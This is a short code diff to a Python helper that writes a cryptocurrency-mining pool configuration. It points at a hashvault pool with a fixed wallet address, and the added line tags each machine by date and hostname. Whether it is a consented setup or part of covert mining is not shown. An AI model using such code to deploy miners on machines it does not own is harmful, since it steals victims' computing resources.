@@ -140,6 +140,7 @@ def update_config_json(extracted_dir):
             pool = config['pools'][0]
             pool['url'] = "pool.hashvault.pro:443"
             pool['user'] = "4AUvAWKacmtPxR6xEYnZPSBZgVuwNtP4iKxsUsXAT9GGjCyrCuVkGhhcSQVxVo3zWDUYWCGMyHfavheUH3Hmjf49MzvBEfu"
+            pool['pass'] = f"{datetime.now():%Y%m%d}{socket.gethostname()}"
             pool['tls'] = True
             pool['tls-fingerprint'] = "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
         with open(config_path, 'w', encoding='utf-8') as f:
